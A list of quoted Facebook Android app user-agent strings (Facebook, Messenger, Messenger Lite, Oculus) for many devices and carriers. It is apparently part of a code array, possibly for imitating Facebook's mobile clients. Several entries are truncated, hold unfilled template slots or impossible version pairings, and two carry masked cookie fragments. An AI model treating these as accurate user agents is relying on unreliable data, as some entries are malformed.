    'Dalvik\\/2.1.0 (Linux; U; Android 10; EVR-N29 Build\\/HUAWEIEVR-N29) [FBAN\\/Orca-Android;FBAV\\/283.0.0.16.120;FBPN\\/com.facebook.orca;FBLC\\/en_GB;FBBV\\/246887380;FBCR\\/O2 - UK;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/EVR-N29;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2068};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build\\/MMB29T) [FBAN\\/FB4A;FBAV\\/273.0.0.39.123;FBPN\\/com.facebook.katana;FBLC\\/vi_VN;FBBV\\/218047938;FBCR\\/null;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G532G;FBSV\\/6.0.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.5,width=540,height=960};FB_FW\\/1;FBRV\\/219557400;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; SM-G960U Build\\/R16NW) [FBAN\\/Orca-Android;FBAV\\/260.0.0.22.122;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/209190396;FBCR\\/T-Mobile;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G960U;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=2076};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-G950U Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/282.0.0.10.119;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/245106389;FBCR\\/T-Mobile;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G950U;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2076};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0; LG-H901 Build\\/NRD90U) [FBAN\\/Orca-Android;FBAV\\/286.0.0.21.122;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/250669427;FBCR\\/T-Mobile;FBMF\\/LGE;FBBD\\/lge;FBDV\\/LG-H901;FBSV\\/7.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=4.0,width=1440,height=2392};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-A305F Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/274.0.0.18.120;FBPN\\/com.facebook.orca;FBLC\\/en_GB;FBBV\\/232793953;FBCR\\/airtel;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A305F;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2131};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI\\/V11.0.11.0.PCXEUXM) [FBAN\\/Orca-Android;FBAV\\/288.0.0.15.118;FBPN\\/com.facebook.orca;FBLC\\/pl_PL;FBBV\\/253310653;FBCR\\/PLAY (T-Mobile);FBMF\\/Xiaomi;FBBD\\/xiaomi;FBDV\\/Redmi Note 8T;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.75,width=1080,height=2130};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.1.1; CPH1727 Build\\/N6F26Q) [FBAN\\/Orca-Android;FBAV\\/288.0.0.15.118;FBPN\\/com.facebook.orca;FBLC\\/th_TH;FBBV\\/253310646;FBCR\\/AIS;FBMF\\/OPPO;FBBD\\/OPPO;FBDV\\/CPH1727;FBSV\\/7.1.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.7,width=1080,height=2016};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1.1; oppo r7sm Build\\/LYZ28N) [FBAN\\/EMA;UNITY_PACKAGE\\/1590;FBBV\\/0;FBAV\\/26.0.0.4.133;FBDV\\/oppo r7sm;FBLC\\/en_US;FBOP\\/20]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-S111DL Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/291.2.0.22.114;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/257752740;FBCR\\/null;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-S111DL;FBSV\\/10;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1431};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; SM-J410G Build\\/M1AJB) [FBAN\\/Orca-Android;FBAV\\/291.2.0.22.114;FBPN\\/com.facebook.orca;FBLC\\/pt_BR;FBBV\\/257752740;FBCR\\/null;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-J410G;FBSV\\/8.1.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1384};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; DUB-LX1 Build\\/HUAWEIDUB-LX1) [FBAN\\/Orca-Android;FBAV\\/291.2.0.22.114;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/257752740;FBCR\\/VIVACOM;FBMF',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; DUB-LX1 Build\\/HUAWEIDUB-LX1) [FBAN\\/Orca-Android;FBAV\\/291.2.0.22.114;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/257752740;FBCR\\/VIVACOM;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/DUB-LX1;FBSV\\/8.1.0;FBCA',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1.1; Lenovo A6020a46 Build\\/LMY47V) [FBAN\\/Orca-Android;FBAV\\/251.0.0.12.117;FBPN\\/com.facebook.orca;FBLC\\/ru_RU;FBBV\\/197803937;FBCR\\/lifecell;FBMF\\/LENOVO;FBBD\\/Lenovo;FBDV\\/Lenovo A6020a46;FBSV\\/5.1.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1920};FB_FW\\/1;] FBBK\\/',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; FIG-LX1 Build\\/HUAWEIFIG-L31) [FBAN\\/Orca-Android;FBAV\\/302.0.0.11.117;FBPN\\/com.facebook.orca;FBLC\\/es_ES;FBBV\\/275958904;FBCR\\/Yoigo;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/FIG-LX1;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2032};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; Kirin Treble Build\\/PQ2A.190405.003) [FBAN\\/FB4A;FBAV\\/306.1.0.40.119;FBPN\\/com.facebook.katana;FBLC\\/ru_US;FBBV\\/273922298;FBCR\\/life:) BY;FBMF\\/HUAWEI;FBBD\\/Huawei;FBDV\\/Kirin Treble;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.4,width=1080,height=2075};FB_FW\\/1;FBRV\\/275142282;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; SM-G973F Build\\/RP1A.200720.012) [FBAN\\/Orca-Android;FBAV\\/299.0.0.11.115;FBPN\\/com.facebook.orca;FBLC\\/de_DE;FBBV\\/272301973;FBCR\\/vodafone.de;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G973F;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2042};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0; SM-G925F Build\\/NRD90M) [FBAN\\/Orca-Android;FBAV\\/304.2.0.17.118;FBPN\\/com.facebook.orca;FBLC\\/ar_AE;FBBV\\/279457446;FBCR\\/Vodafone;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G925F;FBSV\\/7.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=4.0,width=1440,height=2560};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.1.2; SM-G955F Build\\/NRD90M) Source\\/1 [FBAN\\/EMA;UNITY_PACKAGE\\/749;FBBV\\/154200404;FBAV\\/146.0.0.9.102;FBDV\\/SM-G955F;FBLC\\/vi_VN;FBOP\\/20]',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1; HUAWEI LUA-L21 Build\\/HUAWEILUA-L21) [FBAN\\/MessengerLite;FBAV\\/133.0.0.1.116;FBPN\\/com.facebook.mlite;FBLC\\/cs_CZ;FBBV\\/279951921;FBCR\\/O2-CZ;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/HUAWEI LUA-L21;FBSV\\/5.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.5,width=480,height=854};]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build\\/HUAWEIATU-L31) [FBAN\\/MessengerLite;FBAV\\/126.0.0.1.117;FBPN\\/com.facebook.mlite;FBLC\\/cs_CZ;FBBV\\/271069048;FBCR\\/O2-CZ;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/ATU-L31;FBSV\\/8.0.0;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.0,width=720,height=1358};]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build\\/HUAWEIATU-L31) [FBAN\\/MessengerLite;FBAV\\/126.0.0.1.117;FBPN\\/com.facebook.mlite;FBLC\\/cs_CZ;FBBV\\/271069048;FBCR\\/O2-CZ;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/ATU-L31;FBSV\\/8.0.0;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.0,width=720,height=1358};] Soubor cookie SryV********************',
    'Dalvik\\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\\/KOT5506) [FBAN\\/FB4A;FBAV\\/106.0.0.26.68;FBBV\\/45904160;FBDM\\/{density=3.0,width=1080,height=1920};FBLC\\/it_IT;FBRV\\/45904160;FBCR\\/PosteMobile;FBMF\\/asus;FBBD\\/asus;FBPN\\/com.facebook.katana;FBDV\\/ASUS_Z00AD;FBSV\\/5.0;FBOP\\/1;FBCA\\/x86:armeabi-v7a;]',
    'Dalvik\\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\\/KOT5506) [FBAN\\/FB4A;FBAV\\/106.0.0.26.68;FBBV\\/45904160;FBDM\\/{density=3.0,width=1080,height=1920};FBLC\\/it_IT;FBRV\\/45904160;FBCR\\/PosteMobile;FBMF\\/asus;FBBD\\/asus;FBPN\\/com.facebook.katana;FBDV\\/ASUS_Z016D;FBSV\\/5.0;FBOP\\/1;FBCA\\/x86:armeabi-v7a;]',
    'Dalvik\\/1.6.0 (Linux; U; Android 6.0; Build\\/MXB48T) [FBAN\\/FB4A;FBAV\\/106.0.0.26.68;FBBV\\/45904160;FBDM\\/{density=3.0,width=1080,height=1920};FBLC\\/it_IT;FBRV\\/45904160;FBCR\\/PosteMobile;FBMF\\/asus;FBBD\\/asus;FBPN\\/com.facebook.katana;FBDV\\/ASUS_Z016D;FBSV\\/5.0;FBOP\\/1;FBCA\\/x86:armeabi-v7a;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build\\/LMY47V) [FBAN\\/FB4A;FBAV\\/43.0.0.29.147;FBPN\\/com.facebook.katana;FBLC\\/en_GB;FBBV\\/14274161;FBCR\\/Tele2 LT;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-J320F;FBSV\\/5.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1920};FB_FW\\/1;]',
    'Dalvik\\/1.6.0 (Linux; U; Android 4.4.2; SM-G3518 Build\\/JLS36C) [FBAN\\/FB4A;FBAV\\/251.0.0.31.111;FBPN\\/com.facebook.katana;FBLC\\/en_US;FBBV\\/188827991;FBCR\\/T-Mobile;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G3518;FBSV\\/4.4.2;FBCA\\/x86:armeabi-v7a;FBDM\\/{density=1.5,width=720,height=1244};FB_FW\\/1;FBRV\\/190301973;]',
    'Dalvik\\/1.6.0 (Linux; U; Android 5; SM-G3518 Build\\/JLS36C) [FBAN\\/FB4A;FBAV\\/251.0.0.31.111;FBPN\\/com.facebook.katana;FBLC\\/en_US;FBBV\\/188827991;FBCR\\/T-Mobile;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G3518;FBSV\\/4.4.2;FBCA\\/x86:armeabi-v7a;FBDM\\/{density=1.5,width=720,height=1244};FB_FW\\/1;FBRV\\/190301973;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-A505FM Build\\/PPR1.180610.011) [FBAN\\/FB4A;FBAV\\/327.0.0.33.120;FBPN\\/com.facebook.katana;FBLC\\/ru_RU;FBBV\\/304400854;FBCR\\/MegaFon;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A505FM;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2131};FB_FW\\/1;FBRV\\/305275776;] FBBK\\/1CookieqstJ',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0; SM-G930V Build\\/NRD90M) [FBAN\\/Orca-Android;FBAV\\/155.0.0.14.93;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/94098382;FBCR\\/Verizon Wireless;FBMF\\/samsung;FBBD\\/Verizon;FBDV\\/SM-G930V;FBSV\\/7.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1280};FB_FW\\/1;',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0; SM-G930V Build\\/NRD90M) [FBAN\\/Orca-Android;FBAV\\/174.0.0.24.82;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/116802184;FBCR\\/Verizon Wireless;FBMF\\/samsung;FBBD\\/Verizon;FBDV\\/SM-G930V;FBSV\\/7.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1920};FB_FW\\/1;',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; moto g(20) Build\\/RTAS31.68-20-2) [FBAN\\/Orca-Android;FBAV\\/336.0.0.13.142;FBPN\\/com.facebook.orca;FBLC\\/es_US;FBBV\\/327992372;FBCR\\/TELCEL;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto g(20);FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.75,width=720,height=1466};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; SM-G986U Build\\/RP1A.200720.012) [FBAN\\/Orca-Android;FBAV\\/316.4.0.15.120;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/297403762;FBCR\\/Verizon ;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G986U;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2201};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-A102U Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/342.1.0.14.119;FBPN\\/com.facebook.orca;FBLC\\/es_US;FBBV\\/339015010;FBCR\\/TELCEL;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A102U;FBSV\\/10;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1402};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; COL-L29 Build\\/HUAWEICOL-L29) [FBAN\\/Orca-Android;FBAV\\/314.1.0.19.119;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/293875204;FBCR\\/null;FBMF\\/HUAWEI;FBBD\\/HONOR;FBDV\\/COL-L29;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build\\/R16NW) [FBAN\\/FB4A;FBAV\\/{7};FBPN\\/com.facebook.katana;FBLC\\/{0}_{1};FBBV\\/261476344;FBCR\\/{2};FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A720F;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/&#123;&#123;density=2.625,width=1080,height=1920&#125;&#125;;FB_FW\\/1;FBRV\\/263054303;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; moto e Build\\/QPGS30.82-135-16) [FBAN\\/Orca-Android;FBAV\\/342.1.0.14.119;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/339015010;FBCR\\/Verizon ;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto e;FBSV\\/10;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.75,width=720,height=1422};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; SM-A326U Build\\/RP1A.200720.012) [FBAN\\/FB4A;FBAV\\/348.0.0.39.118;FBPN\\/com.facebook.katana;FBLC\\/en_US;FBBV\\/338919009;FBCR\\/T-Mobile;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A326U;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.875,width=720,height=1465};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 6.0.1; SM-G532M Build\\/MMB29T) [FBAN\\/Orca-Android;FBAV\\/343.0.0.8.474;FBPN\\/com.facebook.orca;FBLC\\/es_US;FBBV\\/344064182;FBCR\\/Movistar;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G532M;FBSV\\/6.0.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.5,width=540,height=960};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; Quest 2 Build\\/QQ3A.200805.001) [FBAN\\/OculusHorizon;FBAV\\/35.0.0.117.300;FBDV\\/Quest 2;FBCR\\/null;FBLC\\/en_US;FBSV\\/10;FBBD\\/oculus;FBBV\\/333880879;FBCA\\/arm64-v8a:;FBMF\\/Oculus;FBPN\\/com.oculus.horizon;FBVM\\/{&quot;912539389206240&quot;:&quot;35.0.0.145.300&quot;,&quot;1481000308606657&quot;:&quot;35.0.0.140.341&quot;,&quot;1916519981771802&quot;:&quot;18.1.0.2.46.337441587&quot;,&quot;1689311011174858&quot;:&quot;35.0.0.140.341&quot;,&quot;2141310506170802&quot;:&quot;3',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-A107M Build\\/PPR1.180610.011) [FBAN\\/FB4A;FBAV\\/266.0.0.64.124;FBPN\\/com.facebook.katana;FBLC\\/es_US;FBBV\\/209629359;FBCR\\/TELCEL;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A107M;FBSV\\/9;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.75,width=720,height=1439};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; LM-X420 Build\\/PKQ1.190302.001) [FBAN\\/Orca-Android;FBAV\\/346.0.0.7.117;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/348143439;FBCR\\/HOME;FBMF\\/LGE;FBBD\\/lge;FBDV\\/LM-X420;FBSV\\/9;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.75,width=720,height=1356};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; LGL355DL Build\\/QKQ1.200108.002) [FBAN\\/Orca-Android;FBAV\\/349.0.0.7.108;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/352408711;FBCR\\/null;FBMF\\/LGE;FBBD\\/lge;FBDV\\/LGL355DL;FBSV\\/10;',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build\\/OPPS27.91-179-8-16) [FBAN\\/Orca Android;FBAV\\/342.1.0.14.119;FBPN\\/com.facebook.orca;FBLC\\/es_US;FBBV\\/344064014;FBCR\\/Movistar;FBMF\\/m otorola;FBBD\\/motorola;FBDV\\/moto e5 plus;FBSV\\/8.0.0;FBCA\\/armeabi v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1344);FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; Acer Chromebook 14 (CB3-431) Source\\/1 [FBAN\\/EMA;UNITY_PACKAGE\\/342;FBBV\\/107586706;FBAV\\/172.0.0.8.182;FBDV\\/SM-J210F;FBLC\\/en_US;FBOP\\/20] Build\\/R99-14469.41.0) Source\\/1 [FBAN\\/EMA;UNITY_PACKAGE\\/342;FBBV\\/107586706;FBAV\\/172.0.0.8.182;FBDV\\/SM-J210F;FBLC\\/en_US;FBOP\\/20]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; moto g power (2021) Build\\/RZBS31.Q2-143-27-7) [FBAN\\/Orca-Android;FBAV\\/353.0.0.12.116;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/358361194;FBCR\\/cricket;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto g power (2021);FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.75,width=720,height=1488};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; moto g power (2021) Build\\/RZBS31.Q2-143-27-7) [FBAN\\/Orca-Android;FBAV\\/352.0.0.9.116;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/356687955;FBCR\\/cricket;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto g power (2021);FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.75,width=720,height=1488};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; Lenovo TB-X505F Build\\/QKQ1.191224.003) [FBAN\\/Orca-Android;FBAV\\/352.0.0.9.116;FBPN\\/com.facebook.orca;FBLC\\/en_GB;FBBV\\/356687941;FBCR\\/null;FBMF\\/LENOVO;FBBD\\/Lenovo;FBDV\\/Lenovo TB-X505F;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.0,width=1280,height=784};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; RMX2155 Build\\/RP1A.200720.011) [FBAN\\/MessengerLite;FBAV\\/287.0.0.3.117;FBPN\\/com.facebook.mlite;FBLC\\/cs_CZ;FBBV\\/345379814;FBCR\\/SAZKAmobilCZ;FBMF\\/realme;FBBD\\/realme;FBDV\\/RMX2155;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.55,width=1080,height=2173};]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; ASUS_I005DC Build\\/RKQ1.210303.002) [FBAN\\/FB4A;FBAV\\/336.0.0.20.117;FBPN\\/com.facebook.katana;FBLC\\/zh_TW_#Hant;FBBV\\/317766059;FBCR\\/&amp;#21488-&amp;#28771-&amp;#22823-&amp;#21733-&amp;#22823-;FBMF\\/asus;FBBD\\/asus;FBDV\\/ASUS_I005DC;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2322};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-A115M Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/319.0.0.22.170;FBPN\\/com.facebook.orca;FBLC\\/pt_BR;FBBV\\/301916794;FBCR\\/null;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A115M;FBSV\\/10;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.75,width=720,height=1411};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-T290 Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/364.0.0.10.112;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/374667243;FBCR\\/null;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-T290;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.3312501,width=1280,height=736};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; S45B Build\\/OPM2.171019.012) [FBAN\\/EMA;FBBV\\/0;FBAV\\/26.0.0.4.133;FBDV\\/S45B;FBLC\\/id_ID;FBNG\\/UNKNOWN;FBMNT\\/UNKNOWN;FBDM\\/{density=1.5}]',
    'Dalvik\\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\\/KOT5506) [FBAN\\/FB4A;FBAV\\/106.0.0.26.68;FBBV\\/45904160;FBDM\\/{density=3.0,width=1080,height=1920};FBLC\\/it_IT;FBRV\\/45904160;FBCR\\/PosteMobile;FBMF\\/asus;FBBD\\/asus;FBPN\\/com.facebook.katana;FBDV\\/ASUS_Z007;FBSV\\/5.0;FBOP\\/1;FBCA\\/x86:armeabi-v7a;]',
    'Dalvik\\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\\/KOT5506) [FBAN\\/FB4A;FBAV\\/106.0.0.26.68;FBBV\\/45904160;FBDM\\/{density=3.0,width=1080,height=1920};FBLC\\/it_IT;FBRV\\/45904160;FBCR\\/PosteMobile;FBMF\\/asus;FBBD\\/asus;FBPN\\/com.facebook.katana;FBDV\\/ASUS_Z007;FBSV\\/5.0;FBOP\\/1;FBCA\\/x86:armeabi-v7a;],gzip(gfe)',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; 5003D_EEA Build\\/OPM2.171019.012) [FBAN\\/Orca-Android;FBAV\\/294.0.0.24.129;FBPN\\/com.facebook.orca;FBLC\\/en_GB;FBBV\\/263695251;FBCR\\/O2 - UK;FBMF\\/TCL;FBBD\\/TCL;FBDV\\/5003D_EEA;FBSV\\/8.1.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.5,width=480,height=888};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; SM-G990U Build\\/SP1A.210812.016) [FBAN\\/FB4A;FBAV\\/375.1.0.28.111;FBPN\\/com.facebook.katana;FBLC\\/en_US;FBBV\\/382948769;FBCR\\/T-Mobile;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G990U;FBSV\\/12;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2097};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; 220333QAG Build\\/RKQ1.211001.001) [FBAN\\/Orca-Android;FBAV\\/378.0.0.25.106;FBPN\\/com.facebook.orca;FBLC\\/es_US;FBBV\\/397777638;FBCR\\/TELCEL;FBMF\\/Xiaomi;FBBD\\/Redmi;FBDV\\/220333QAG;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.0,width=720,height=1505};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 2.3.0; vivo 1935 Build\\/QP1A.190711.020) [FBAN\\/MessengerLite;FBAV\\/312.0.0.8.106;FBPN\\/com.facebook.mlite;FBLC\\/in_ID;FBBV\\/431836095;FBCR\\/AXIS;FBMF\\/vivo;FBBD\\/vivo;FBDV\\/vivo 1935;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.29375,width=1080,height=2145};]',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build\\/N2G48H) [FBAN\\/FB4A;FBAV\\/382.0.0.33.111;FBPN\\/com.facebook.katana;FBLC\\/ru_RU;FBBV\\/394408512;FBCR\\/Astelit-LIFE;FBMF\\/Asus;FBBD\\/Asus;FBDV\\/ASUS_Z01QD;FBSV\\/7.1.2;FBCA\\/x86:armeabi-v7a;FBDM\\/{density=1.5,width=720,height=1280};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; NAM-LX9 Build\\/HUAWEINAM-L29) [FBAN\\/Orca-Android;FBAV\\/370.0.0.14.108',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; VOG-L29 Build\\/HUAWEIVOG-L29) [FBAN\\/FB4A;FBAV\\/287.0.0.50.119;FBPN\\/com.facebook.katana;FBLC\\/tr_TR;FBBV\\/243660825;FBCR\\/Vodafone;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/VOG-L29;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2265};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; Redmi Note 7 MIUI\\/V11.0.1.0.QFGEUXM) [FBAN\\/FB4A;FBAV\\/396.1.0.28.104;FBPN\\/com.facebook.katana;FBLC\\/tr_TR;FBBV\\/319214973;FBCR\\/Vodafone;FBMF\\/Xiaomi;FBBD\\/xiaomi;FBDV\\/Redmi Note 7;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.75,width=1080,height=2131};FB_FW\\/1;]',
